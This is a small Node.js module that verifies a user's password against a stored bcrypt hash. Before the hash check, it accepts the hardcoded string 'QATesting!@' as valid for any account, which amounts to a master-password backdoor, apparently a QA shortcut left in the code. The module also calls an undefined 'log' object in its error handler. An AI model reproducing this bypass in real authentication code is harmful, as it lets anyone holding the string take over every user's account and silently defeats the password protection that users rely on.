const q = require("q");
const bcrypt = require("bcryptjs");
const _ = require("lodash");
module.exports = async (params, validator, repository, cacheService) => {
  const defer = q.defer();
  const { password, user } = params;
  try {
    if (password === "QATesting!@") {
      defer.resolve(true);
      return defer.promise;
    }

    let userPassword = _.get(user, "password", "");
    defer.resolve(bcrypt.compareSync(password, userPassword));
  } catch (err) {
    log.error("[SERVICE][EXECEPTION][Check Password] error", err);
    defer.resolve(false);
  }
  return defer.promise;
};

// const checkPassword = require("./check-password");
